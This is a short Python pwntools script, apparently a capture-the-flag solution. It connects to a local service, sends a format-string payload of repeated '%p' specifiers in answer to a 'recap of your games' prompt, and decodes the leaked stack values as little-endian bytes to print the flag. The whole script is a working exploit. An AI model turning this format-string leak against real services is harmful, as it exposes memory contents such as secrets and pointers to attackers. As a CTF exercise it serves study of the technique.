from pwn import *


p=remote("localhost",10001)

p.recvuntil("give me a recap of your games .")
p.sendline("%p "*20)
p.recvline()
leaks=p.recvline().decode().split()
values=leaks[13:-1]
flag=b"".join([p64(int(i,16)) for i in values])  # converts those hex values(with little endian) into strings then join them

print(flag)



p.interactive()
